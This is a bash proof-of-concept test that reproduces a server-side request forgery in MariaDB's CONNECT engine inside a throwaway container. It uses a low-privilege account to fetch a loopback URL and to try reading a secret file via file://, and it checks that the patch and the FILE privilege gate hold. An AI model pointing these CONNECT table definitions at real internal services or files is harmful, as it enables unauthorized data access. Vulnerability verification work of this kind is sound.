#!/usr/bin/env bash
set -Eeuo pipefail

ROOT="$(cd "$(dirname "$0")" && pwd)"
IMAGE_TAG="mariadb-connect-rest-ssrf:test"
CONTAINER="mariadb-connect-rest-ssrf-$RANDOM"
ROOT_PASSWORD="test-only-root-password"
LOW_PASSWORD="test-only-low-password"
MARIADB_IMAGE="${MARIADB_IMAGE:-mariadb:11.8}"
LOG_DIR="$ROOT/results"
mkdir -p "$LOG_DIR"
rm -f "$LOG_DIR"/*.log

cleanup() {
  docker rm -f "$CONTAINER" >/dev/null 2>&1 || true
}
trap cleanup EXIT

command -v docker >/dev/null || { echo "docker is required" >&2; exit 2; }

echo "[build] image=$MARIADB_IMAGE"
docker build --build-arg "MARIADB_IMAGE=$MARIADB_IMAGE" -t "$IMAGE_TAG" "$ROOT"

echo "[start] isolated MariaDB container"
docker run -d --name "$CONTAINER" \
  -e "MARIADB_ROOT_PASSWORD=$ROOT_PASSWORD" \
  "$IMAGE_TAG" >/dev/null

ready=0
for _ in $(seq 1 90); do
  if docker exec "$CONTAINER" mariadb-admin --protocol=tcp -h127.0.0.1 \
      -uroot "-p$ROOT_PASSWORD" ping --silent >/dev/null 2>&1; then
    ready=1
    break
  fi
  if [[ "$(docker inspect -f '{{.State.Running}}' "$CONTAINER" 2>/dev/null || echo false)" != "true" ]]; then
    break
  fi
  sleep 2
done
if [[ "$ready" -ne 1 ]]; then
  docker logs "$CONTAINER" >"$LOG_DIR/startup.log" 2>&1 || true
  cat "$LOG_DIR/startup.log"
  echo "FAIL: MariaDB did not become ready" >&2
  exit 1
fi

docker exec "$CONTAINER" mariadb --protocol=tcp -h127.0.0.1 \
  -uroot "-p$ROOT_PASSWORD" -e "
SELECT VERSION() AS tested_version;
SELECT PLUGIN_NAME, PLUGIN_STATUS FROM information_schema.PLUGINS
 WHERE PLUGIN_NAME='CONNECT';
" | tee "$LOG_DIR/server-info.log"

# Run a harmless HTTP fixture bound to loopback inside the same container.
docker exec "$CONTAINER" sh -c '
  mkdir -p /tmp/rest-ssrf-fixture
  printf "LOCAL_HTTP_FIXTURE_MARKER,ok\\n" > /tmp/rest-ssrf-fixture/probe.csv
  printf "LOCAL_FILE_SECRET_MARKER,do-not-disclose\\n" > /tmp/rest-ssrf-fixture/secret.csv
  chown -R mysql:mysql /tmp/rest-ssrf-fixture
  chmod 600 /tmp/rest-ssrf-fixture/secret.csv
  (cd /tmp/rest-ssrf-fixture && nohup python3 -m http.server 18765 --bind 127.0.0.1 >/tmp/rest-ssrf-http.log 2>&1 </dev/null &)
'

http_ready=0
for _ in $(seq 1 20); do
  if docker exec "$CONTAINER" python3 -c \
    'import urllib.request; urllib.request.urlopen("http://127.0.0.1:18765/probe.csv", timeout=1).read()' \
    >/dev/null 2>&1; then
    http_ready=1
    break
  fi
  sleep 1
done
if [[ "$http_ready" -ne 1 ]]; then
  docker exec "$CONTAINER" cat /tmp/rest-ssrf-http.log || true
  echo "FAIL: loopback HTTP fixture did not start" >&2
  exit 1
fi

docker exec -i "$CONTAINER" mariadb --protocol=tcp -h127.0.0.1 \
  -uroot "-p$ROOT_PASSWORD" <<SQL
CREATE DATABASE appdb;
CREATE USER 'rest_low'@'%' IDENTIFIED BY '$LOW_PASSWORD';
GRANT CREATE, SELECT ON appdb.* TO 'rest_low'@'%';
FLUSH PRIVILEGES;
SQL

grants="$(docker exec "$CONTAINER" mariadb --protocol=tcp -h127.0.0.1 \
  -uroot "-p$ROOT_PASSWORD" -N -e "SHOW GRANTS FOR 'rest_low'@'%';")"
printf '%s\n' "$grants" | tee "$LOG_DIR/lowpriv-grants.log"
if printf '%s\n' "$grants" | grep -Eiq '(^|[, ])(FILE|SUPER)([, ;]|$)'; then
  echo "FAIL: test account unexpectedly has FILE or SUPER" >&2
  exit 1
fi
echo "[PASS] low-privilege account has CREATE and SELECT only (no FILE/SUPER)"

# Test A: HTTP to a loopback-only listener, with FILE_NAME omitted.
set +e
http_output="$(docker exec -i "$CONTAINER" mariadb --protocol=tcp -h127.0.0.1 \
  -urest_low "-p$LOW_PASSWORD" appdb --show-warnings <<'SQL'
CREATE TABLE http_probe (
  value VARCHAR(512)
) ENGINE=CONNECT TABLE_TYPE=CSV
  HTTP='http://127.0.0.1:18765/probe.csv' SEP_CHAR=',';
SELECT value FROM http_probe;
SQL
  2>&1)"
http_rc=$?
set -e
printf '%s\n' "$http_output" | tee "$LOG_DIR/loopback-http.log"
docker exec "$CONTAINER" cat /tmp/rest-ssrf-http.log >"$LOG_DIR/http-listener.log" 2>&1 || true
if [[ "$http_rc" -ne 0 ]] || ! printf '%s' "$http_output" | grep -Fq "LOCAL_HTTP_FIXTURE_MARKER"; then
  echo "FAIL: low-privilege REST table did not retrieve the loopback HTTP fixture" >&2
  exit 1
fi
if ! grep -Fq 'GET /probe.csv' "$LOG_DIR/http-listener.log"; then
  echo "FAIL: loopback listener did not record the server-side request" >&2
  exit 1
fi
echo "[PASS] low-privilege CONNECT REST table fetched a loopback HTTP URL"

# Test B: the patched curl option should reject file://.
set +e
file_output="$(docker exec -i "$CONTAINER" mariadb --protocol=tcp -h127.0.0.1 \
  -urest_low "-p$LOW_PASSWORD" appdb --show-warnings <<'SQL'
CREATE TABLE file_probe (
  value VARCHAR(512)
) ENGINE=CONNECT TABLE_TYPE=CSV
  HTTP='file:///tmp/rest-ssrf-fixture/secret.csv' SEP_CHAR=',';
SELECT value FROM file_probe;
SQL
  2>&1)"
file_rc=$?
set -e
printf '%s\n' "$file_output" | tee "$LOG_DIR/file-protocol.log"
docker logs "$CONTAINER" >"$LOG_DIR/mariadb-container.log" 2>&1 || true
if printf '%s' "$file_output" | grep -Fq "LOCAL_FILE_SECRET_MARKER"; then
  echo "FAIL: file:// secret was disclosed on the patched image" >&2
  exit 1
fi
if [[ "$file_rc" -eq 0 ]]; then
  echo "FAIL: file:// request unexpectedly completed successfully" >&2
  exit 1
fi
echo "[PASS] file:// did not disclose the mysql-owned sentinel file"

# Test C: setting FILE_NAME should invoke the normal FILE privilege gate.
set +e
acl_output="$(docker exec -i "$CONTAINER" mariadb --protocol=tcp -h127.0.0.1 \
  -urest_low "-p$LOW_PASSWORD" appdb --show-warnings <<'SQL'
CREATE TABLE file_acl_control (
  value VARCHAR(512)
) ENGINE=CONNECT TABLE_TYPE=CSV
  FILE_NAME='file-acl-control.csv'
  HTTP='http://127.0.0.1:18765/probe.csv' SEP_CHAR=',';
SQL
  2>&1)"
acl_rc=$?
set -e
printf '%s\n' "$acl_output" | tee "$LOG_DIR/file-privilege-control.log"
if [[ "$acl_rc" -eq 0 ]] || ! printf '%s' "$acl_output" | grep -Eiq 'FILE privilege|FILE privilege\(s\)'; then
  echo "FAIL: FILE_NAME control did not enforce the FILE privilege check" >&2
  exit 1
fi
echo "[PASS] non-empty FILE_NAME is denied without FILE privilege"

echo
echo "RESULT: patched-image test completed."
echo "- loopback HTTP SSRF path: REPRODUCED"
echo "- file:// read: BLOCKED by the patched curl protocol restriction"
echo "- FILE_NAME privilege control: DENIED as expected"
echo "This is a controlled loopback test, not a test against cloud metadata or other internal hosts."
